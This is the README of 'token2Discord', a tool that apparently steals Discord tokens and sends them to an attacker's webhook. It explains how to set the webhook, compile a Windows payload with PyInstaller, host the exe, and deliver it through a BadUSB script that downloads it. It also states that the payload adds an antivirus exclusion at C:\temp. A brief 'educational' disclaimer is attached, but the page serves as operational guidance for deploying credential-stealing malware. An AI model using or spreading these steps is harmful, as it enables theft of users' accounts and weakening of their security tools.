# token2Discord

# Disclaimer
This utility is strictly for educational and/or purposes of which an employer has authority to do so.
The user, YOU, are responsible for the usage of such utility. With that said, use it wisely and legally.

# Prerequisites
```
1. Python3
2. Discord Webhook
```

# Install
```
git clone https://github.com/CharlesTheGreat/token2Discord

# for pyvenv (optional)
python3 -m venv <any_name>
source <any_name>/bin/activate

# required
cd token2Discord/
pip3 install -r requirements
```

# Quick Start
* Change in the token2Discord.py file:
        self.WEBHOOK = "DISCORD_WEBHOOK"
        -       to your discord webhook

# Compile
* When compiling as an executable, be sure you're on Windows for a Windows payload!! (Common Sense, as MacOS compiled payload will not run on a Windows!)
```
python3 -m PyInstaller token2Discord.py --onefile
```
* After compiling:
        - Inside the /dist directory is your exe file
        
# Upload
* Upload exe to a server, local python server, etc... do as you will.

# BADUSB
* Edit the line "LINK_TO_EXE" in the token2Discord.txt to the link to your newly created exe file.

# Key note
* this is not made to bypass AV, but rather sets an exclusion at C:\temp, then resets such  
